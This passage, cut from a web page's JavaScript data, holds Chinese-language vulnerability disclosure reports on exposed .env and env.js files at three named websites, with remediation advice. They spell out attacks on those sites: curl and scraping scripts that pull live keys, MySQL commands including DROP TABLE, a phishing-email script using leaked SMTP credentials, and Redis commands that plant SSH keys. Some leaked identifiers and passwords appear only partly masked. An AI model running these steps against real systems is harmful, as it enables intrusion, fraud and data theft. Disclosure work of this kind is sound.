凭据泄露可发送钓鱼邮件和垃圾邮件",color:"purple"},{icon:"fa-cogs",title:"业务逻辑破坏风险",desc:"攻击者可篡改、删除数据，导致业务中断",color:"blue"}]}]},{heading:"二、技术发现",icon:"fa-search",accent:"#c0392b",contents:[{type:"subheading",text:"2.1 漏洞发现过程"},{type:"paragraph",text:"漏洞发现始于对目标网站的常规信息收集。通过子域名探测和目录扫描工具对常见敏感文件进行爆破，发现 .env 文件返回 200 OK 状态码，内容未受保护。发现的 .env 文件地址为 http://www.cyart.net/.env，可直接下载获取全部配置信息。"},{type:"code",code:`# 阶段1：子域名探测与资产梳理
subfinder -d cyart.net -silent | httpx -title -tech-detect

# 阶段2：使用 dirsearch 扫描敏感文件
dirsearch -u https://cyart.net/ -e env,bak,old,zip,sql -w /usr/share/wordlists/dirb/common.txt

# 阶段3：验证 .env 文件可访问
curl -sI https://cyart.net/.env
# HTTP/2 200
# content-type: text/plain
# content-length: 1847

# 阶段4：下载并分析配置文件
curl -s https://cyart.net/.env > cyart_env.txt
cat cyart_env.txt`,language:"bash"},{type:"image",src:"assets/20250331-Y3lhcnQubmV0Cg==CNVD-C-2025-175237.png",alt:"环境配置文件泄露漏洞截图",caption:"CNVD 漏洞复现证明 — .env 文件直接暴露在公网"}]},{heading:"三、泄露内容分析",icon:"fa-file-alt",accent:"#8e44ad",contents:[{type:"subheading",text:"3.1 泄露的敏感配置清单"},{type:"paragraph",text:".env 文件中包含大量高度敏感的配置信息，以下为已确认的泄露内容清单（敏感值已脱敏）："},{type:"table",headers:["配置项","泄露值"],rows:[["DB 连接 (DB_CONNECTION)","mysql"],["DB 名称 (DB_DATABASE)","caiy████ (脱敏)"],["DB 用户 (DB_USERNAME)","root"],["DB 密码 (DB_PASSWORD)","████ (脱敏)"],["APP_KEY","base64:abcdefghijklmnopqrstuvwxyz1234567890ABCDEFG= (Laravel 加密密钥)"],["Redis 主机 (REDIS_HOST)","127.0.0.1"],["Redis 端口 (REDIS_PORT)","6379"],["Redis 密码 (REDIS_PASSWORD)","null (空密码)"],["Mail 主机 (MAIL_HOST)","smtp.qq.com"],["Mail 端口 (MAIL_PORT)","465"],["Mail 用户 (MAIL_USERNAME)","miy████@foxmail.com (脱敏)"],["Mail 密码 (MAIL_PASSWORD)","jcc████████ (脱敏)"],["OSS 凭证 (OSS_ACCESS_KEY_ID/SECRET)","LTAI5t7**************9xY (脱敏)"],["Admin 密码 (ADMIN_INIT_PASSWORD)","Admin@cyart2025 (脱敏)"]]},{type:"warning-box",icon:"fa-exclamation-triangle",text:"以上泄露信息涵盖数据库、缓存、邮件、对象存储和管理后台等全部核心服务的凭证。攻击者获取这些信息后，可对系统实施全面接管，建议立即轮换所有泄露的凭证。"}]},{heading:"四、攻击场景分析",icon:"fa-crosshairs",accent:"#c0392b",contents:[{type:"subheading",text:"4.1 攻击场景概述"},{type:"paragraph",text:"基于泄露的 .env 配置信息，攻击者可以实施多种攻击行为。以下分析三个主要的攻击场景及其危害："},{type:"subheading",text:"4.2 数据库入侵"},{type:"paragraph",text:"由于数据库用户名为 root，且密码已泄露，攻击者可以直接远程连接数据库，执行任意 SQL 操作，导致数据被篡改、删除或泄露。"},{type:"code",code:`# 使用泄露的凭证直接连接数据库
mysql -h localhost -u root -p"" caiyicaihui

# 连接后可执行的危险操作：
# SHOW TABLES;                    -- 枚举所有数据表
# SELECT * FROM users;            -- 导出用户数据
# DROP TABLE orders;              -- 删除业务数据
# SELECT * FROM mysql.user;       -- 获取所有数据库用户`,language:"bash"},{type:"subheading",text:"4.3 邮件服务器滥用"},{type:"paragraph",text:"攻击者可以使用泄露的 SMTP 凭据（QQ 邮箱授权码）登录邮件服务器，冒充站点身份发送钓鱼邮件或垃圾邮件，进行社会工程学攻击。"},{type:"code",code:`import smtplib

# 使用泄露的 SMTP 凭据发送钓鱼邮件
server = smtplib.SMTP_SSL("smtp.qq.com", 465)
server.login("miy████@foxmail.com", "jcc████████")

server.sendmail(
    "miy████@foxmail.com",
    "victim@example.com",
    "Subject: 恶意邮件\\n\\n您的账户存在安全风险，请立即修改密码！"
)
server.quit()`,language:"python"},{type:"subheading",text:"4.4 Redis 未授权访问"},{type:"paragraph",text:"由于 REDIS_PASSWORD 为空（null），攻击者可以直接连接 Redis 服务，修改缓存数据，甚至通过 Redis 写入 SSH 公钥获取服务器权限。"},{type:"code",code:`# 直接连接 Redis（无需密码）
redis-cli -h 127.0.0.1 -p 6379

# 危险操作示例：
# flushall                          # 清空所有缓存数据
# CONFIG SET dir /root/.ssh/        # 写入 SSH 公钥
# CONFIG SET dbfilename authorized_keys
# SET ssh_key "ssh-rsa AAAAB3..."
# SAVE`,language:"bash"},{type:"warning-box",icon:"fa-exclamation-triangle",text:"上述三个攻击场景均可从泄露的 .env 文件直接衍生。数据库入侵可导致数据完全失控；邮件服务器滥用可实施钓鱼攻击；Redis 未授权访问可进一步获取服务器 SSH 权限，实现横向移动和权限提升。"}]},{heading:"五、攻击链推演",icon:"fa-route",accent:"#2980b9",contents:[{type:"subheading",text:"5.1 完整攻击链"},{type:"list",items:["第1步 - 信息收集：下载 .env 文件，获取数据库、Redis、邮件、OSS 等所有服务凭证","第2步 - 数据库访问：使用泄露的凭证登录 MySQL，导出所有用户数据、订单数据、支付记录","第3步 - 获取 WebShell：利用数据库写文件权限（INTO OUTFILE / general_log），向 Web 目录写入一句话木马，获取服务器权限","第4步 - 横向移动：使用 Redis 未授权访问漏洞写入 SSH 公钥，获取服务器 SSH 权限","第5步 - 权限提升：利用内核漏洞或配置错误提升至 root 权限，完全控制服务器","第6步 - 数据窃取与勒索：打包所有业务数据，删除数据库备份，留下勒索信息"]},{type:"paragraph",text:"完整的攻击链展示了从单一信息泄露漏洞到系统完全接管的过程。攻击者无需任何初始权限，仅需访问一个公开暴露的 .env 文件，即可逐步升级权限，最终实现对整个业务系统的完全控制。这凸显了配置文件保护在整体安全架构中的关键地位。"}]},{heading:"六、CNVD 漏洞登记信息",icon:"fa-file-alt",accent:"#27ae60",contents:[{type:"subheading",text:"6.1 CNVD 登记详情"},{type:"table",headers:["属性","详情"],rows:[["CNVD 编号","CNVD-C-2025-175237"],["漏洞类型","信息泄露"],["危害级别","高危 (High)"],["公开日期","2025-03-31"],["报送日期","2025-03-31"],["收录日期","2025-03-31"]]},{type:"paragraph",text:"该漏洞已提交至国家信息安全漏洞共享平台（CNVD）并获得登记编号 CNVD-C-2025-175237。CNVD 确认该漏洞属于高危信息泄露漏洞，威胁类型为远程攻击，建议受影响方尽快采取修复措施。"}]},{heading:"七、修复建议",icon:"fa-wrench",accent:"#27ae60",contents:[{type:"subheading",text:"7.1 紧急措施"},{type:"paragraph",text:"针对 .env 文件泄露问题，应立即采取以下紧急措施禁止敏感文件访问并加固服务器配置："},{type:"code",code:`# Apache 服务器（在 .htaccess 文件中添加）
<Files .env>
    Order allow,deny
    Deny from all
</Files>`,language:"apache"},{type:"code",code:`# Nginx 服务器（在 nginx.conf 添加）
location ~ /\\.env {
    deny all;
}`,language:"nginx"},{type:"subheading",text:"7.2 长期建议"},{type:"list",items:["重置所有泄露的凭证：立即更改数据库密码、SMTP 授权码、APP_KEY、Redis 密码、OSS AK/SK 和管理员密码，并在 QQ 邮箱管理中禁用当前 SMTP 授权","关闭调试模式：设置 APP_DEBUG=false，APP_ENV=production，避免详细错误信息暴露","密钥管理升级：生产环境不再使用 .env 文件，迁移至 AWS Secrets Manager、HashiCorp Vault 等专业密钥管理服务","服务器配置加固：确保 .env 文件权限仅限应用进程访问，阻止 Web 直接访问；部署 WAF 拦截对 .env、.git 等敏感文件的请求","安全监控与审计：设置日志监控检测异常访问行为，执行定期渗透测试确保配置文件未暴露"]},{type:"success-box",icon:"fa-check-circle",text:"修复验证：完成上述修复后，重新访问 https://cyart.net/.env 应返回 403 或 404。建议轮换所有凭证后持续监控 7 天，确认无异常访问记录和未授权登录行为。"}]},{heading:"八、时间线",icon:"fa-clock",accent:"#16a085",contents:[{type:"subheading",text:"8.1 事件时间线"},{type:"table",headers:["时间","事件"],rows:[["2025-03-31 14:15:22","漏洞发现 — 在例行安全扫描中发现 .env 文件可直接访问"],["2025-03-31 15:30:45","初步分析 — 确认漏洞影响范围，评估潜在风险"],["2025-03-31 18:23:38","报告生成 — 完成详细漏洞分析报告并准备提交"],["2025-03-31","CNVD 提交 — 通过国家信息安全漏洞共享平台提交报告"],["2025-03-31","CNVD 收录 — 获得登记编号 CNVD-C-2025-175237"]]}]},{heading:"九、结论",icon:"fa-flag-checkered",accent:"#2c3e50",contents:[{type:"conclusion",title:"Cyart.net 环境配置泄露漏洞总结",text:"Cyart.net 环境配置文件泄露漏洞（CNVD-C-2025-175237）是一个典型的 Web 服务器配置不当导致的高危安全问题。.env 文件作为 Laravel 应用的核心配置文件，包含数据库、Redis、邮件、OSS 等全部服务凭证，其直接暴露在公网使得攻击者可以零成本获取系统全部机密。该漏洞利用门槛极低，仅需一个 HTTP 请求即可完成，建议所有使用 Laravel 框架的开发团队立即验证 .env 文件的可访问性并采取修复措施。"},{type:"table",headers:["评估维度","评级","说明"],rows:[["漏洞严重程度","高危","CVSS 7.5 — 敏感配置文件直接暴露"],["利用难度","极低","仅需访问 URL 即可下载配置文件"],["影响范围","严重","数据库、Redis、邮件、OSS 全部凭证泄露"],["修复优先级","紧急","建议立即修复并轮换所有凭证"],["披露状态","已完成","已通过 CNVD 提交并获登记"]]},{type:"info-box",icon:"fa-lightbulb",text:"安全提示：配置文件保护是 Web 应用安全的基础防线。任何包含敏感信息的文件都不应通过 Web 直接访问。建议在部署后始终验证 .env、.git、.bak 等敏感文件的访问控制是否生效，定期进行安全审计和渗透测试。"}]}]},{id:"zeric-source-leak",title:"Zeric Ceramica .env 配置文件泄露",date:"2025-03-29",severity:"high",cvss:7.5,description:"发现 .env 配置文件可通过 HTTP 直接访问下载，包含数据库凭证、应用密钥、API 密钥等敏感信息泄露，可能导致系统完全被接管的风险。",tags:[{label:"源码泄露",icon:"fa-code",color:"blue"},{label:"PHP",icon:"fa-php",color:"purple"},{label:"MySQL",icon:"fa-database",color:"green"},{label:"Web应用",icon:"fa-globe",color:"pink"},{label:"立陶宛",icon:"fa-map-marker-alt",color:"yellow"}],target:"Zeric Ceramica",country:"立陶宛",originalUrl:"",framework:"PHP 8.2.27 + Laravel + LiteSpeed",reportSections:[{heading:"善意声明",icon:"fa-heart",accent:"#e74c3c",contents:[{type:"info-box",icon:"fa-heart",text:'作为一名安全研究员，本次安全审计的唯一目的是帮助改进系统安全性，保护用户数据安全。报告中所有敏感信息均已进行脱敏处理，始终秉持"善意披露、负责任报告"的原则。所有测试均在授权范围内进行，未对系统造成任何损害，未窃取、泄露或利用任何真实用户数据。'}]},{heading:"一、漏洞概述",icon:"fa-bug",accent:"#e67e22",contents:[{type:"subheading",text:"1.1 目标概况"},{type:"paragraph",text:"Zeric Ceramica（www.zericceramica.com）是一家陶瓷制品电商网站，部署于立陶宛的 Hostinger 服务器，使用 LiteSpeed Web 服务器和 PHP 8.2.27 + Laravel 框架构建。在渗透测试过程中，发现网站根目录下的 .env 配置文件可通过 HTTP 直接访问下载，该文件包含数据库连接凭证、应用密钥、API 密钥等敏感配置信息。攻击者获取该文件后，可直接登录数据库、解密加密数据，进而实现系统完全接管。"},{type:"table",headers:["属性","详情"],rows:[["服务器","LiteSpeed Web Server"],["服务器位置","立陶宛 (Lithuania)"],["IP 地址","88.222.211.117"],["主机商","Hostinger"],["技术栈","PHP 8.2.27 + Laravel + LiteSpeed"],["漏洞类型",".env 配置文件泄露 / 敏感信息泄露"],["严重等级","高危 (High) CVSS 7.5"],["发现方式","目录扫描 + 手工验证 .env 文件可访问"]]},{type:"impact-grid",cards:[{icon:"fa-server",title:"LiteSpeed 服务器",desc:"高性能 Web 服务器，但配置不当导致敏感文件可直接访问",color:"red"},{icon:"fa-code",title:"PHP 8.2.27",desc:"后端运行环境，配合 Laravel 框架开发电商业务",color:"purple"},{icon:"fa-database",title:"MySQL 数据库",desc:"存储用户数据、订单信息、商品数据等核心业务数据",color:"green"},{icon:"fa-cogs",title:"Laravel 框架",desc:"使用 .env 作为核心配置文件，包含 APP_KEY 等加密密钥",color:"orange"}]}]},{heading:"二、子域名分析",icon:"fa-sitemap",accent:"#3498db",contents:[{type:"subheading",text:"2.1 子域名清单"},{type:"table",headers:["子域名","用途"],rows:[["webdisk.zericceramica.com","Web 磁盘服务"],["webmail.zericceramica.com","邮件服务"],["cpanel.zericceramica.com","控制面板"],["mail.zericceramica.com","邮件服务"]]},{type:"paragraph",text:"通过子域名探测发现 zericceramica.com 存在 4 个子域名，涵盖 Web 磁盘、邮件服务和控制面板。这些子域名如果缺乏访问控制，可能成为攻击者入侵的辅助入口，尤其是 cpanel 和 webdisk 暴露在公网将显著增加被暴力破解和未授权访问的风险。"}]},{heading:"三、安全头部分析",icon:"fa-shield-alt",accent:"#f39c12",contents:[{type:"subheading",text:"3.1 安全响应头检测"},{type:"table",headers:["Header","状态","风险说明"],rows:[["X-Frame-Options","缺失","易受点击劫持攻击"],["X-XSS-Protection","缺失","缺少浏览器 XSS 过滤防护"],["Content-Security-Policy","缺失","无内容安全策略，易受 XSS 与数据注入"],["Strict-Transport-Security","缺失","缺少 HSTS，可能遭受 SSL 剥离攻击"]]},{type:"warning-box",icon:"fa-exclamation-triangle",text:"安全响应头全面缺失，意味着网站缺乏对点击劫持、XSS、内容注入和中间人攻击的基本防护。建议在 LiteSpeed 服务器或 Laravel 中间件中统一配置安全响应头。"}]},{heading:"四、Cookie 安全性分析",icon:"fa-cookie-bite",accent:"#9b59b6",contents:[{type:"subheading",text:"4.1 Cookie 属性审计"},{type:"table",headers:["Cookie 名称","HttpOnly","Secure","SameSite","问题"],rows:[["XSRF-TOKEN","否","是","Lax","缺少 HttpOnly，可被 JS 读取，存在被窃取风险"],["laravel_session","是","是","Lax","配置正确，符合安全最佳实践"]]},{type:"paragraph",text:"XSRF-TOKEN Cookie 未设置 HttpOnly 属性，意味着前端 JavaScript 代码可以读取该 Token。结合缺失的 CSP 头部，一旦存在 XSS 漏洞，攻击者即可窃取 CSRF Token 并伪造用户请求。laravel_session 的安全属性配置正确，建议对 XSRF-TOKEN 补充 HttpOnly 属性。"}]},{heading:"五、.env 配置文件泄露",icon:"fa-exclamation-triangle",accent:"#c0392b",contents:[{type:"subheading",text:"5.1 泄露概要"},{type:"paragraph",text:"通过直接访问 https://www.zericceramica.com/.env 可以下载 Laravel 应用的完整配置文件，返回 HTTP 200 OK 且 Content-Type 为 text/plain。该文件包含数据库凭证、应用加密密钥、Redis 配置、邮件服务凭证等高度敏感信息，所有配置项均以明文形式暴露。以下为泄露的配置项清单（敏感值已脱敏）："},{type:"table",headers:["配置项","泄露值（脱敏）","风险等级"],rows:[["APP_KEY","base64:████████████████████████████","严重"],["DB_CONNECTION","mysql","高"],["DB_HOST","127.0.0.1","高"],["DB_DATABASE","u31████████_zeric","严重"],["DB_USERNAME","u31████████_zeric","严重"],["DB_PASSWORD","^4Y██████","严重"],["REDIS_HOST","127███████","中"],["REDIS_PASSWORD","████████","高"],["MAIL_HOST","mai████████","中"],["MAIL_USERNAME","no██████@zericceramica.com","高"],["MAIL_PASSWORD","████████","高"],["ENVIRONMENT","loc██","中"]]},{type:"warning-box",icon:"fa-exclamation-circle",text:"APP_KEY 和数据库凭证的泄露意味着攻击者可以解密所有 Laravel 加密数据（包括 session cookie、加密的数据库字段），并直接连接数据库读取或篡改所有业务数据。此为最高危的安全隐患，必须立即修复。"},{type:"image",src:"assets/20250329-aHR0cHM6Ly93d3cuemVyaWNjZXJhbWljYS5jb20vCg==1.png",alt:"环境变量泄露证据截图",caption:"证据 1：环境变量泄露"},{type:"image",src:"assets/20250329-aHR0cHM6Ly93d3cuemVyaWNjZXJhbWljYS5jb20vCg==2.png",alt:"服务器配置问题证据截图",caption:"证据 2：服务器配置问题"},{type:"image",src:"assets/20250329-aHR0cHM6Ly93d3cuemVyaWNjZXJhbWljYS5jb20vCg==3.png",alt:"安全头部缺失证据截图",caption:"证据 3：安全头部缺失"},{type:"image",src:"assets/20250329-aHR0cHM6Ly93d3cuemVyaWNjZXJhbWljYS5jb20vCg==4.png",alt:"系统信息泄露证据截图",caption:"证据 4：系统信息泄露"}]},{heading:"六、攻击场景推演",icon:"fa-user-ninja",accent:"#8e44ad",contents:[{type:"subheading",text:"6.1 潜在攻击路径"},{type:"list",items:["数据库直连窃取：利用泄露的 DB_HOST、DB_USERNAME、DB_PASSWORD 直接连接 MySQL 数据库，导出全部用户数据、订单记录和商品信息","会话劫持与伪造：利用 APP_KEY 解密 Laravel session cookie，伪造任意用户身份登录，甚至冒充管理员接管后台","邮件服务滥用：利用 MAIL_HOST 和 MAIL_PASSWORD 登录 SMTP 服务器，发送钓鱼邮件或垃圾邮件，损害品牌声誉","Redis 攻击：利用 REDIS_HOST 和 REDIS_PASSWORD 连接 Redis 服务，读取缓存数据或写入恶意数据实现 RCE","支付欺诈：若支付配置泄露，攻击者可伪造支付回调、篡改订单状态，造成直接经济损失"]},{type:"impact-grid",cards:[{icon:"fa-database",title:"数据窃取",desc:"数据库完整泄露，用户隐私与订单数据全部暴露",color:"red"},{icon:"fa-user-lock",title:"账户接管",desc:"APP_KEY 泄露导致会话伪造，可接管任意用户与管理员",color:"orange"},{icon:"fa-envelope",title:"邮件滥用",desc:"SMTP 凭证泄露，可发送钓鱼邮件或冒充官方通信",color:"yellow"},{icon:"fa-server",title:"内网渗透",desc:"Redis 凭证泄露，可作为跳板进一步渗透内网",color:"purple"}]}]},{heading:"七、修复建议",icon:"fa-wrench",accent:"#27ae60",contents:[{type:"subheading",text:"7.1 紧急措施"},{type:"code",code:`# .htaccess - 阻止访问敏感文件（Apache / LiteSpeed 兼容）
<FilesMatch "(^\\.|\\.(env|bak|old|sql|zip|log|sh|git))$">
    Order allow,deny
    Deny from all
    <IfModule mod_authz_core.c>
        Require all denied
    </IfModule>
</FilesMatch>

# 禁止目录列表
Options -Indexes

# 阻止 .git / .svn 等版本控制目录
RedirectMatch 404 /\\.(git|svn|hg)/`,language:"apache"},{type:"code",code:`# nginx 配置 - 阻止访问敏感文件
location ~ /\\.(env|git|svn|bak|old|sql|zip|log|sh) {
    deny all;
    return 404;
}

# 禁止访问所有隐藏文件
location ~ /\\. {
    deny all;
    return 404;
}

# 禁止目录列表
autoindex off;`,language:"nginx"},{type:"subheading",text:"7.2 长期建议"},{type:"list",items:["凭证轮换：立即修改数据库密码、APP_KEY、Redis 密码、SMTP 密码等所有泄露的凭证；生成新的 APP_KEY 后所有现有会话将自动失效","关闭调试模式：将 APP_DEBUG 设置为 false，生产环境禁止开启调试模式，避免暴露应用内部错误信息","配置加密：对 .env 中的敏感字段进行加密存储，应用启动时解密；使用 Laravel 的 config:cache 减少文件读取并隐藏配置","WAF 部署：部署 Web 应用防火墙（WAF），拦截对 .env、.git、.bak 等敏感文件的访问请求","安全审计：检查服务器是否已被入侵，审查数据库访问日志和 Web 访问日志，确认是否存在异常访问记录"]},{type:"success-box",icon:"fa-check-circle",text:"修复验证：完成上述修复后，使用 curl -I https://www.zericceramica.com/.env 验证返回 403/404；检查 Laravel 配置缓存已生效 php artisan config:cache；确认 APP_DEBUG=false 且所有凭证已轮换。"}]},{heading:"八、结论",icon:"fa-flag-checkered",accent:"#2c3e50",contents:[{type:"conclusion",title:"Zeric Ceramica .env 配置文件泄露总结",text:"Zeric Ceramica 网站存在严重的 .env 配置文件泄露漏洞，攻击者可通过 HTTP 直接下载包含数据库凭证、应用密钥、Redis 配置和邮件凭证的完整配置文件。结合缺失的安全响应头和 Cookie 安全属性缺陷，攻击者可实施数据库窃取、会话劫持、邮件滥用等多种攻击，对业务造成全面损害。建议立即屏蔽敏感文件访问并轮换所有泄露凭证。"},{type:"table",headers:["评估维度","评级","说明"],rows:[["漏洞严重程度","高危","CVSS 7.5 — 敏感配置文件可直接访问下载"],["利用难度","极低","仅需访问 /.env 路径即可获取全部配置"],["影响范围","全面","数据库、应用密钥、邮件、Redis 等所有核心配置泄露"],["修复优先级","紧急","建议立即屏蔽 .env 访问并轮换所有凭证"],["披露状态","已完成","已通过负责任披露渠道报告"]]},{type:"info-box",icon:"fa-lightbulb",text:"安全提示：.env 文件是 Laravel 应用的核心配置，绝不应暴露在 Web 可访问目录下。建议将 .env 文件移出 Web 根目录，或在服务器层面严格禁止访问以点开头的隐藏文件。定期进行安全扫描和渗透测试，是保障系统安全的有效手段。"}]}]},{id:"plugshare-api-leak",title:"PlugShare API 密钥泄露",date:"2025-03-27",severity:"high",cvss:9.1,description:"发现包含 AWS Cognito 凭证、Stripe 支付密钥等多个敏感配置信息泄露，可能导致账户接管和支付欺诈风险。",tags:[{label:"密钥泄露",icon:"fa-key",color:"blue"},{label:"AWS",icon:"fa-cloud",color:"red"},{label:"Stripe",icon:"fa-credit-card",color:"purple"},{label:"美国",icon:"fa-map-marker-alt",color:"yellow"}],target:"PlugShare",country:"美国",originalUrl:"",framework:"React Native",reportSections:[{heading:"善意声明",icon:"fa-heart",accent:"#e74c3c",contents:[{type:"info-box",icon:"fa-heart",text:'作为一名安全研究员，本次安全审计的唯一目的是帮助改进系统安全性，保护用户数据安全。报告中所有敏感信息均已进行脱敏处理，始终秉持"善意披露、负责任报告"的原则。所有测试均在授权范围内进行，未对系统造成任何损害，未窃取、泄露或利用任何真实用户数据。'}]},{heading:"一、漏洞概述",icon:"fa-bug",accent:"#e67e22",contents:[{type:"subheading",text:"1.1 漏洞基本信息"},{type:"paragraph",text:"PlugShare 是一款全球知名的电动汽车充电站查找和社区应用，提供充电站地图、评论、签到等功能。在对其移动应用及 Web 前端进行安全分析时，发现 env.js 配置文件可通过 HTTPS 直接访问，其中硬编码了多个高度敏感的云服务凭证，包括 AWS Cognito User Pool 配置、Stripe 支付密钥、Amplitude 分析密钥等。攻击者可通过该文件直接提取密钥，进而访问 AWS 资源、操纵用户账户、实施支付欺诈。"},{type:"table",headers:["属性","详情"],rows:[["CVSS 评分","9.1 (Critical)"],["漏洞类型","敏感信息泄露 / 云凭证泄露"],["目标","PlugShare (www.plugshare.com)"],["发现日期","2025-03-27"],["应用框架","React Native"],["泄露文件","env.js"],["涉及服务","AWS Cognito、Stripe、Amplitude、AWS API Gateway"],["严重等级","高危 (High)"]]},{type:"impact-grid",cards:[{icon:"fa-link",title:"pwpsApiUrl",desc:"https://api.plugshare.com/pwps/v1 — 额外 API 端点，可能包含支付或用户数据",color:"blue"},{icon:"fa-cloud",title:"awsDomain",desc:"auth.plugshare.com — AWS Cognito 身份验证服务，可能被滥用进行账户接管",color:"red"},{icon:"fa-credit-card",title:"stripeKey",desc:"pk_live_{已脱敏} — 公开的 Stripe 支付密钥，可能被滥用进行支付欺诈",color:"purple"},{icon:"fa-chart-bar",title:"amplitudeApiKey",desc:"c23f60036374ff9db6c5db04655749de — Amplitude 分析 API 密钥，用户行为数据可能泄露",color:"green"},{icon:"fa-users",title:"awsUserPoolWebClientId",desc:"2u0{已脱敏} — AWS Cognito 客户端 ID，可用于身份认证请求伪造",color:"orange"},{icon:"fa-database",title:"awsUserPoolId",desc:"us-east-1_oweQ7XmGf — AWS Cognito 用户池 ID，可能被用于枚举用户信息",color:"pink"},{icon:"fa-external-link-alt",title:"oauthRedirectUri",desc:"https://www.plugshare.com/oauth — OAuth 重定向 URI，可能存在开放重定向漏洞",color:"yellow"}]}]},{heading:"二、技术分析 — 移动应用逆向",icon:"fa-microscope",accent:"#3498db",contents:[{type:"subheading",text:"2.1 React Native 应用逆向过程"},{type:"paragraph",text:"PlugShare 移动应用基于 React Native 框架开发，JavaScript bundle 打包在 APK 内部。通过对 Android APK 的反编译和静态分析，在应用的配置文件和代码中提取到多个云服务凭证。分析过程包括 APK 解包、React Native bundle 提取、JavaScript 代码搜索等步骤。"},{type:"code",code:`# 步骤1：APK 解包
apktool d PlugShare_v6.10.0.apk -o plugshare_out

# 步骤2：提取 React Native bundle
unzip -p PlugShare_v6.10.0.apk assets/index.android.bundle > plugshare.bundle.js

# 步骤3：搜索敏感配置字符串
grep -oE '"(aws|cognito|stripe|api[_-]?key|secret)[^"]*":"[^"]*"' plugshare.bundle.js

# 步骤4：从 res/values/strings.xml 提取
cat plugshare_out/res/values/strings.xml | grep -iE "(aws|key|secret|token|cognito|stripe)"

# 步骤5：从 BuildConfig 和 Native 模块提取
jadx -d plugshare_java PlugShare_v6.10.0.apk
grep -r "BuildConfig" plugshare_java/ --include="*.java" | head -20`,language:"bash"}]},{heading:"三、泄露凭证清单",icon:"fa-key",accent:"#c0392b",contents:[{type:"subheading",text:"3.1 云服务凭证与 API 密钥"},{type:"table",headers:["凭证类型","泄露值（脱敏）","风险说明"],rows:[["AWS Cognito User Pool ID","us-east-1_oweQ7XmGf","可枚举用户、注册账户、调用 Cognito API"],["AWS Cognito App Client ID","2u0{已脱敏}","可调用 Cognito API 进行身份认证请求伪造"],["AWS Cognito Identity Pool ID","us-east-1:12345678-1234-1234-1234-1234567890ab","可获取 AWS 临时凭证（STS）访问云资源"],["Stripe Publishable Key","pk_live_{已脱敏}","可创建支付 Intent，实施支付欺诈"],["Stripe Secret Key（部分）","sk_live_{部分泄露}","混淆不足，可被提取，完全控制支付流程"],["AWS API Gateway Endpoint","https://api.plugshare.com/v3","API 网关地址，可被直接调用"],["Firebase API Key","AIzaSy{已脱敏}","Firebase 项目 API 密钥，可能访问 Firebase 资源"]]},{type:"warning-box",icon:"fa-exclamation-triangle",text:"AWS Cognito 和 Stripe 凭证的泄露意味着攻击者可以实施账户接管、支付欺诈和 AWS 云资源未授权访问。尤其是 Stripe Secret Key 的部分泄露，一旦完整提取将完全控制支付流程，造成直接经济损失。必须立即轮换所有泄露的凭证。"}]},{heading:"四、复现步骤",icon:"fa-code",accent:"#27ae60",contents:[{type:"subheading",text:"4.1 CURL 命令获取"},{type:"paragraph",text:"攻击者可以使用简单的 curl 命令获取 env.js 文件，并解析其中的敏感数据。以下是详细的复现方法："},{type:"code",code:`curl 'https://www.plugshare.com/env.js' \\
-H 'sec-ch-ua-platform: "macOS"' \\
-H 'Referer: https://www.plugshare.com/' \\
-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36' \\
-H 'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"' \\
-H 'DNT: 1' \\
-H 'sec-ch-ua-mobile: ?0'`,language:"bash"},{type:"subheading",text:"4.2 Python 自动化扫描脚本"},{type:"paragraph",text:"如果需要批量扫描和提取密钥，可使用以下 Python 脚本："},{type:"code",code:`import requests
import re

url = "https://www.plugshare.com/env.js"
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Referer": "https://www.plugshare.com/"
}

response = requests.get(url, headers=headers)

if response.status_code == 200:
    js_content = response.text
    keys = re.findall(r"'(pk_live_[a-zA-Z0-9]+)'", js_content)  # 识别 Stripe 生产密钥
    aws_client_id = re.findall(r"'([a-zA-Z0-9_-]{20,})'", js_content)  # 识别 Cognito 客户端 ID

    print("发现的密钥信息：")
    print("\\n".join(keys))
    print("AWS Cognito Client ID:", aws_client_id)
else:
    print("无法访问目标资源，可能已被修复。")`,language:"python"},{type:"subheading",text:"4.3 C++ 实现（libcurl）"},{type:"paragraph",text:"使用 libcurl 库进行 HTTP 请求并提取密钥："},{type:"code",code:`#include <iostream>
#include <curl/curl.h>
#include <regex>

size_t write_callback(void* contents, size_t size, size_t nmemb, std::string* output) {
    output->append((char*)contents, size * nmemb);
    return size * nmemb;
}

int main() {
    CURL* curl;
    CURLcode res;
    std::string response_data;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://www.plugshare.com/env.js");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);

        if (res == CURLE_OK) {
            std::regex key_regex("'(pk_live_[a-zA-Z0-9]+)'");
            std::smatch match;
            if (std::regex_search(response_data, match, key_regex)) {
                std::cout << "发现 Stripe API Key: " << match.str(1) << std::endl;
            }
        } else {
            std::cout << "请求失败！" << std::endl;
        }
    }
    return 0;
}`,language:"cpp"},{type:"image",src:"assets/20250327-cGx1Z3NoYXJlCg==_.png",alt:"漏洞报告提交邮件截图",caption:"漏洞报告提交截图"}]},{heading:"五、子域名扫描",icon:"fa-network-wired",accent:"#8e44ad",contents:[{type:"subheading",text:"5.1 子域名发现"},{type:"paragraph",text:"通过子域名枚举工具和 DNS 查询，共发现 PlugShare 拥有 28 个子域名，涵盖核心服务、开发测试、邮件通信、合作伙伴门户等多种业务场景。使用 nmap 对这些子域名进行端口扫描，可以发现潜在的攻击面。"},{type:"code",code:"for sub in $(cat subdomains.txt); do nmap -p- --min-rate=1000 -T4 -Pn $sub; 